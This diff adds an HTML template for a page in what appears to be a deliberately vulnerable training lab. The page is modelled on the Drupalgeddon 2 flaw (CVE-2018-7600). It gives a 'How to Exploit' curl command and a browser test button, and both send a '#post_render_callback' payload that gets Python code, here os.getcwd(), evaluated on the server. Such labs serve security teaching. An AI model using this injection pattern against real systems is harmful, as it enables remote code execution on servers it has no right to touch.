@@ -1,0 +1,28 @@
+{% extends 'base.html' %}
+{% block title %}User Registration (CVE-2018-7600 Analog){% endblock %}
+{% block content %}
+<div class="pagehead">
+  <h1>Station User Registration</h1>
+  <p><span class="badge warn">CVE-2018-7600 (Drupalgeddon 2) analog</span> — POST JSON with a <code>#post_render_callback</code> key to trigger expression evaluation.</p>
+</div>
+<div class="panel">
+  <h2>How to <span>Exploit</span></h2>
+  <pre class="code">curl -X POST /drupal/user/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","#post_render_callback":"__import__(\"os\").getcwd()"}'</pre>
+  <button class="btn small" onclick="testDrupal()">Test via browser →</button>
+  <pre class="code" id="drupal-result" style="margin-top:10px;display:none;"></pre>
+</div>
+<script>
+async function testDrupal() {
+  const r = await fetch('/drupal/user/register', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({"username":"test","#post_render_callback":"__import__('os').getcwd()"})
+  });
+  const d = await r.json();
+  document.getElementById('drupal-result').style.display = 'block';
+  document.getElementById('drupal-result').textContent = JSON.stringify(d, null, 2);
+}
+</script>
+{% endblock %}
